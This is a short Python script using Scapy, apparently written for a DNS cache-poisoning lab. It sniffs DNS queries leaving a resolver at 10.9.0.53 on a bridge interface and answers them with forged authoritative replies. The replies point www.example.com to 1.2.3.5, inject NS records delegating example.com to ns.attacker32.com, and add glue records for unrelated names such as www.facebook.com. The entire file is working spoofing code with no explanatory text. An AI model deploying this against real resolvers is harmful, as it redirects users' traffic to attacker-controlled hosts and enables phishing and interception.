#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='1.2.3.5')

        # Authority section two NS records for example.com
        NSsec1 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns.attacker32.com')
        NSsec2 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns.example.com')

        # Additional section three entries
        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',
                        ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns.example.net', type='A',
                        ttl=259200, rdata='5.6.7.8')
        Addsec3 = DNSRR(rrname='www.facebook.com', type='A',
                        ttl=259200, rdata='3.4.5.6')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2, arcount=3,
                     an=Anssec, ns=NSsec1/NSsec2,
                     ar=Addsec1/Addsec2/Addsec3)

        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print(f"Spoofed reply sent to {pkt[IP].src}")

f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-328e72dc9f42', filter=f, prn=spoof_dns)
